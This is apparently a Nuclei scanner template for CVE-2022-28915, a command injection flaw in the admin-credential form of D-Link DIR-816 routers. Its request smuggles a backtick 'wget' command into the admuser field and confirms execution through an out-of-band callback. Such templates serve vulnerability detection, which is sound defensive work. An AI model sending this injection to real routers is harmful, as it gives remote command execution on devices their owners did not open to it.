id: CVE-2022-28915

info:
  name: D-Link DIR-816 - Remote Code Execution
  author: For3stCo1d
  severity: critical
  description: |
    D-Link DIR-816 A2_v1.10CNB04 was discovered to contain a command injection vulnerability via the admuser and admpass parameters in /goform/setSysAdm.
  reference:
    - https://github.com/EPhaha/IOT_vuln/tree/main/d-link/dir-816/1
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-28915
  tags: cve,cve2022,dlink,router,rce,oast

requests:
  - raw:
      - |
        POST /goform/setSysAdm HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        tokenid=xxxx&admuser=`wget+http://{{interactsh-url}}`

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the HTTP Interaction
        words:
          - "http"
